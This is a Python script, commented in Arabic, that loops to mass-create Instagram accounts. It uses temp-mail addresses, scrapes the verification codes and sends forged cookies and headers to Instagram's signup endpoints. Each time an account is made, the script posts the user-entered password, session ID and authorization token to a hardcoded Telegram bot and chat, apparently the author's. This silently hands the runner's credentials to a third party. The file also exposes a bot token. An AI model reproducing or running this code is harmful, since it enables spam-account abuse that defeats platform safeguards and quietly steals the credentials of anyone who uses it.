import requests, uuid, re, random, time, hmac, hashlib, secrets, string, json
from colorama import init, Fore, Style
init(autoreset=True)

# ==================== الألوان المخصصة ====================
E = '\033[1;31m'      # أحمر غامق
W2 = '\x1b[38;5;120m' # أخضر فاتح
W3 = '\x1b[38;5;204m' # وردي
W4 = '\x1b[38;5;150m' # أخضر باهت
W5 = '\x1b[1;33m'     # أصفر غامق
W6 = '\x1b[1;31m'     # أحمر غامق
W7 = "\033[1;33m"     # أصفر
W8 = '\x1b[38;5;117m' # أزرق فاتح
W9 = "\033[1m\033[34m"# أزرق غامق
P = '\x1b[1;97m'      # أبيض
B = '\x1b[1;94m'      # أزرق
O = '\x1b[1;96m'      # سيان
Z = '\x1b[1;30m'      # أسود غامق
X = '\x1b[1;33m'      # أصفر
F = '\x1b[2;32m'      # أخضر باهت
L = '\x1b[1;95m'      # أرجواني
C = '\x1b[2;35m'      # أرجواني باهت
A = '\x1b[2;39m'      # رمادي
J = '\x1b[38;5;208m'  # برتقالي
J1 = '\x1b[38;5;202m' # برتقالي غامق
J2 = '\x1b[38;5;203m' # أحمر برتقالي
J21 = '\x1b[38;5;204m'# وردي غامق
J22 = '\x1b[38;5;209m'# مرجاني
F1 = '\x1b[38;5;76m'  # أخضر ليموني
C1 = '\x1b[38;5;120m' # أخضر فاتح
P1 = '\x1b[38;5;150m' # أخضر زيتي
P2 = '\x1b[38;5;190m' # أصفر مخضر

# ==================== الإعدادات ====================

E   = '\033[1;31m'
W2  = '\x1b[38;5;120m'
W3  = '\x1b[38;5;204m'
W4  = '\x1b[38;5;150m'
W5  = '\x1b[1;33m'
W6  = '\x1b[1;31m'
W7  = "\033[1;33m"
W8  = '\x1b[38;5;117m'
W9  = "\033[1m\033[34m"
P   = '\x1b[1;97m'
B   = '\x1b[1;94m'
O   = '\x1b[1;96m'
Z   = '\x1b[1;30m'
X   = '\x1b[1;33m'
F   = '\x1b[2;32m'
L   = '\x1b[1;95m'
C   = '\x1b[2;35m'
A   = '\x1b[2;39m'
J   = '\x1b[38;5;208m'
J1  = '\x1b[38;5;202m'
J2  = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1  = '\x1b[38;5;76m'
C1  = '\x1b[38;5;120m'
P1  = '\x1b[38;5;150m'
P2  = '\x1b[38;5;190m'

ks = "8555009710:AAHZd1wn3DaX1vd5TtqZHFf5jeAWKHmif2s"
print(f"{Z}—" * 35)

zb = "6640098641"
print(f"{Z}—" * 35)

tez = input(f"{W8}┌─[{W4} Enter Your Password {W8}]\n{W8}└─{J21}➤ {P}")
print(f"{Z}—" * 35)

print(f"\n{F1}[+] {W2}All data has been entered successfully!")

print(W4 + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
ahhh = 120

def send_telegram_message(message):
    if ks and zb:
        try:
            url = f"https://api.telegram.org/bot{ks}/sendMessage"
            data = {"chat_id": zb, "text": message, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
            return True
        except Exception as e:
            print(Fore.RED + f"[ - ] فشل الإرسال: {e}")
            return False
    return False

TEMP_MAIL_API = "https://api.internal.temp-mail.io/api/v3/email"

def create_temp_email():
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    json_data = {'min_name_length': 10, 'max_name_length': 10}
    try:
        resp = requests.post(f'{TEMP_MAIL_API}/new', headers=headers, json=json_data, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("email")
    except:
        pass
    return None

def get_messages(email_address):
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        resp = requests.get(f'{TEMP_MAIL_API}/{email_address}/messages', headers=headers, timeout=10)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return []

def extract_verification_code(text):
    match = re.search(r'\b(\d{6})\b', text)
    return match.group(1) if match else ""

def wait_for_verification_code(email_address, max_wait=ahhh):
    print(Fore.YELLOW + f"[ * ] انتظار الكود على {email_address} ...")
    start = time.time()
    while time.time() - start < max_wait:
        messages = get_messages(email_address)
        if messages:
            for msg in messages:
                subject = msg.get('subject', '').lower()
                if any(x in subject for x in ["verify", "code", "instagram"]):
                    content = msg.get('body_text', '') or msg.get('body_html', '')
                    code = extract_verification_code(content)
                    if code:
                        print(Fore.GREEN + f"[ + ] الكود المستلم: {code}")
                        return code
        time.sleep(3)
    print(Fore.RED + "[ - ] لم يتم الحصول على الكود")
    return ""

# ==================== دوال مساعدة ====================
def random_string(length=12):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_device_id():
    return str(uuid.uuid4()).upper()

def make():
    print(Fore.CYAN + "[ * ] جاري إنشاء بريد مؤقت...")
    email = create_temp_email()
    if not email:
        print(Fore.RED + "[ - ] فشل إنشاء البريد")
        return False
    print(Fore.GREEN + f"[ + ] البريد: {email}")

    session = requests.Session()
    device_id = generate_device_id()
    mid = random_string(24)
    csrftoken = random_string(32)

    session.cookies.set("ig_did", device_id)
    session.cookies.set("mid", mid)
    session.cookies.set("csrftoken", csrftoken)
    session.cookies.set("datr", random_string(24))

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 Instagram 275.0.0.27.98',
        'Content-Type': 'application/x-www-form-urlencoded',
        'x-ig-app-id': '1217981644879628',
        'x-csrftoken': csrftoken,
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
    }
    session.headers.update(headers)

    # 1. التحقق من صحة البريد
    data = {'email': email, 'jazoest': '22141'}
    resp = session.post('https://www.instagram.com/api/v1/web/accounts/check_email/', data=data)
    if resp.status_code != 200:
        print(Fore.RED + "[ - ] فشل التحقق من البريد")
        return False

    # 2. إرسال كود التأكيد
    data = {'device_id': device_id, 'email': email, 'jazoest': '22141'}
    resp = session.post('https://www.instagram.com/api/v1/accounts/send_verify_email/', data=data)
    if resp.status_code != 200:
        print(Fore.RED + "[ - ] فشل إرسال الكود")
        return False

    code = wait_for_verification_code(email)
    if not code:
        return False

    session.headers['referer'] = 'https://www.instagram.com/accounts/signup/emailConfirmation/'
    data = {'code': code, 'device_id': device_id, 'email': email, 'jazoest': '22141'}
    resp = session.post('https://www.instagram.com/api/v1/accounts/check_confirmation_code/', data=data)
    if resp.status_code != 200:
        print(Fore.RED + "[ - ] فشل تأكيد الكود - ربما الكود خاطئ أو انتهت صلاحيته")
        return False

    try:
        signup_code = resp.json().get("signup_code", "")
        if not signup_code:
            print(Fore.RED + "[ - ] لم يتم استلام signup_code")
            return False
    except:
        print(Fore.RED + "[ - ] استجابة غير صالحة من الخادم")
        return False

    username = random_string(17)

    session.headers['referer'] = 'https://www.instagram.com/accounts/signup/username/'
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{tez}',
        'day': '26',
        'email': email,
        'first_name': 'by #Aven',
        'month': '8',
        'username': username,
        'year': '1985',
        'client_id': device_id,
        'seamless_login_enabled': '1',
        'tos_version': 'row',
        'force_sign_up_code': signup_code,
        'jazoest': '22801',
    }
    resp = session.post('https://www.instagram.com/api/v1/web/accounts/web_create_ajax/', data=data)

    if 'user_id' in resp.text:
        auth = resp.headers.get("ig-set-authorization", "")
        user_id = resp.json().get('user_id', 'N/A')
        sessionid = session.cookies.get('sessionid', 'N/A')
        now = time.strftime('%Y-%m-%d %H:%M:%S')

        print(Fore.GREEN + f"\n[✓] تم إنشاء الحساب بنجاح!")
        print(Fore.CYAN + f"[+] البريد: {email}")
        print(Fore.CYAN + f"[+] المستخدم: {username}")
        print(Fore.CYAN + f"[+] كلمة المرور: {tez}")
        print(Fore.CYAN + f"[+] ID الحساب: {user_id}")
        print(Fore.CYAN + f"[+] Session ID: {sessionid}")
        print(Fore.CYAN + f"[+] Authorization: {auth}")

        
        with open("ABOUD.txt", "a", encoding="utf-8") as f:
            f.write(f"\n[{now}] تم الإنشاء\n")
            f.write(f"Email: {email}\nUsername: {username}\nPass: {tez}\nUserID: {user_id}\nSession: {sessionid}\nAuth: {auth}\n{'-'*40}\n")

        
        msg = f"""<b>✅ تم إنشاء حساب انستقرام</b>
🕒 {now}

📧 <code>{email}</code>
👤 <code>{username}</code>
🔑 <code>{tez}</code>
🆔 <code>{user_id}</code>
🍪 <code>{sessionid}</code>
🔐 <code>{auth}</code>

⚡ BY: @vc0_z"""
        send_telegram_message(msg)
        return True
    else:
        print(Fore.RED + f"[ - ] فشل الإنشاء: {resp.text[:200]}")
        return False

if __name__ == "__main__":
    while True:
        try:
            if make():
                time.sleep(random.randint(4, 13))
            else:
                time.sleep(5)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[ - ] تم الإيقاف بواسطة المستخدم.")
            break
        except Exception as e:
            print(Fore.RED + f"[ - ] خطأ: {e}")
            time.sleep(5)